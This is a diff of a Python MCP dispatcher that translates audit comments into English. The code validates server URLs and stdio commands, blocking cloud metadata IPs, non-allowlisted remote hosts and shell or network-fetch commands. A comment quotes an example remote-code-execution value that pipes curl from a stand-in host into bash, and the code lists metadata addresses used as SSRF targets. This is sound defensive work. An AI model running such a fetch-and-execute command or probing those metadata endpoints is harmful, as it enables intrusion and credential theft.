@@ -16,11 +16,13 @@ from .base import SubDispatcher
 
 logger = logging.getLogger(__name__)
 
-# 审计 E-5: MCP register_server 原连任意 URL + 起任意 stdio 命令无校验 = RCE/SSRF 汇.
-# 默认拒云元数据 IP (169.254.169.254 link-local) + 明显内网探测目标, 允许
-# localhost (本地 MCP 服务). FUSION_MCP_ALLOWLIST=host1,host2 限死可连主机 (逗号
-# 分隔, 设了则只放行该集合). stdio 命令挡 shell 直连 (sh -c / bash -c) + 网络拉
-# 取 (curl/wget), 防 stdio_cmd=["bash","-c","curl evil|sh"] RCE.
+# Audit E-5: MCP register_server originally connected to any URL and launched any
+# stdio command without validation = RCE/SSRF magnet. Deny cloud metadata IPs
+# (169.254.169.254 link-local) and obvious intranet probe targets by default;
+# allow localhost (local MCP services). FUSION_MCP_ALLOWLIST=host1,host2 pins the
+# set of connectable hosts (comma-separated; when set only that set is allowed).
+# stdio commands block direct shell (sh -c / bash -c) and network fetch
+# (curl/wget), preventing stdio_cmd=["bash","-c","curl evil|sh"] RCE.
 _METADATA_IPS = ("169.254.169.254", "169.254.170.2", "100.100.100.200")
 _SSRF_BLOCK_HOSTS = ("metadata.google.internal", "metadata.aws.internal")
 _DANGEROUS_STDIO = (
@@ -41,8 +43,9 @@ _DANGEROUS_STDIO = (
 
 
 def _mcp_validate_server(server_url: str, stdio_cmd) -> str | None:
-    # 返回拒绝原因 str, None = 放行. 审计 E-5: 默认 deny 非 localhost (本地 MCP 服务
-    # 场景), 连远程须显式 FUSION_MCP_ALLOWLIST=host1,host2 (闭集). 再挡元数据 IP/SSRF.
+    # Return a rejection-reason str, None = allow. Audit E-5: deny non-localhost
+    # by default (local MCP service scenario); remote requires an explicit
+    # FUSION_MCP_ALLOWLIST=host1,host2 (closed set). Also blocks metadata IPs/SSRF.
     allow_raw = os.environ.get("FUSION_MCP_ALLOWLIST", "").strip()
     if server_url:
         host = (urlparse(server_url).hostname or "").lower()
@@ -53,14 +56,15 @@ def _mcp_validate_server(server_url: str, stdio_cmd) -> str | None:
             if host and host not in allowed:
                 return f"host '{host}' not in FUSION_MCP_ALLOWLIST"
         else:
-            # 无 allowlist: 仅放行 localhost 系 (本地 MCP), 远程需显式 allowlist.
+            # No allowlist: only localhost-family hosts (local MCP) pass;
+            # remote requires an explicit allowlist.
             if host not in ("", "localhost", "127.0.0.1", "::1", "[::1]"):
                 return (
                     f"host '{host}' not localhost; set FUSION_MCP_ALLOWLIST to "
                     f"allow remote MCP servers"
                 )
     if allow_raw and stdio_cmd and not server_url:
-        # stdio 无 URL host, allowlist 模式下 stdio 需显式允许 (cmd[0]).
+        # stdio has no URL host; in allowlist mode stdio needs explicit allow (cmd[0]).
         allowed = {h.strip().lower() for h in allow_raw.split(",") if h.strip()}
         cmd0 = str(stdio_cmd[0]).lower() if stdio_cmd else ""
         if cmd0 not in allowed:
@@ -77,8 +81,9 @@ def _mcp_validate_server(server_url: str, stdio_cmd) -> str | None:
 
 class McpDispatcher(SubDispatcher):
     async def _admit_mcp_rpc(self, tool_name: str, params: dict) -> dict | None:
-        # 审计 N6: list_resources/prompts 原直连 transport, 完全绕过
-        # ToolFunnel (hooks/permission/budget/审计). 收进单一准入链.
+        # Audit N6: list_resources/prompts originally hit the transport directly,
+        # fully bypassing the ToolFunnel (hooks/permission/budget/audit).
+        # Route them into the single admission chain.
         daemon = self._daemon
         get_runtime = getattr(daemon, "_get_runtime", None)
         if not callable(get_runtime):
@@ -179,7 +184,8 @@ class McpDispatcher(SubDispatcher):
         return mcp_reg
 
     async def _handle_register_server(self, params: dict) -> dict:
-        # 审计 E-5: 校验 server_url/stdio_cmd, 挡元数据 IP + shell/网络 RCE 向量.
+        # Audit E-5: validate server_url/stdio_cmd, blocking metadata IPs and
+        # shell/network RCE vectors.
         server_url = params.get("server_url") or params.get("sse_url") or params.get("post_url")
         stdio_cmd = params.get("stdio_cmd")
         reason = _mcp_validate_server(server_url or "", stdio_cmd)
@@ -239,7 +245,8 @@ class McpDispatcher(SubDispatcher):
         mcp_reg = self._get_mcp_registry()
         server_url = params.get("server_url", "")
         servers = mcp_reg.list_servers()
-        # 审计 E-5: 只对已注册 server 建传输, 挡未注册任意 URL (SSRF 放大器).
+        # Audit E-5: only build transports for registered servers, blocking
+        # unregistered arbitrary URLs (SSRF amplifier).
         if server_url:
             if server_url not in servers:
                 logger.warning("mcp.list_resources blocked: server_url not registered")
@@ -273,7 +280,8 @@ class McpDispatcher(SubDispatcher):
         mcp_reg = self._get_mcp_registry()
         server_url = params.get("server_url", "")
         servers = mcp_reg.list_servers()
-        # 审计 E-5: 只对已注册 server 建传输, 挡未注册任意 URL (SSRF 放大器).
+        # Audit E-5: only build transports for registered servers, blocking
+        # unregistered arbitrary URLs (SSRF amplifier).
         if server_url:
             if server_url not in servers:
                 logger.warning("mcp.list_prompts blocked: server_url not registered")
